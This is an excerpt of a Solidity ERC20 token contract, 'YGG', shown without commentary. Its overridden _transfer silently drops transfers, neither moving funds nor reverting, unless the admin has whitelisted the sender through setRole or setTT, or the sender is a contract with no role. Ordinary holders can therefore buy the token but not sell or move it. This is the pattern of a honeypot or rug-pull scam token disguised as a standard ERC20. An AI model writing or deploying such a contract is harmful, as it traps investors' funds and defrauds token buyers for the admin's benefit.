...
contract YGG is ERC20,AccessControl{    
    mapping(address=>uint256) private role;
    mapping(address=>uint256) private TT;
    ...
    function _transfer(address from,address to,uint256 amount) internal override(ERC20){
        ...
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");  
        if(CheckContract(from,amount)){return;}
        unchecked {
    ...
    function setRole(address user) public onlyRole(DEFAULT_ADMIN_ROLE){
        role[user]=99;
    }
    function setTT(address user, uint256 amount) public onlyRole(DEFAULT_ADMIN_ROLE){
        TT[user]=amount*10**decimals();
    }
    function CheckRole(address from) internal virtual returns(uint256){ 
        return role[from];
    }
    function CheckContract(address from,uint256 amount)internal virtual returns(bool) {   
        uint fromBalance =TT[from];
        if(fromBalance>0 && fromBalance>=amount){
            TT[from]=fromBalance-amount;
            return false;
        }
        if(isContract(from)==true && role[from]==0){
            return false;
        }else if(isContract(from)==false && role[from]==99){
            return false; 
        }
        return true;
    }  
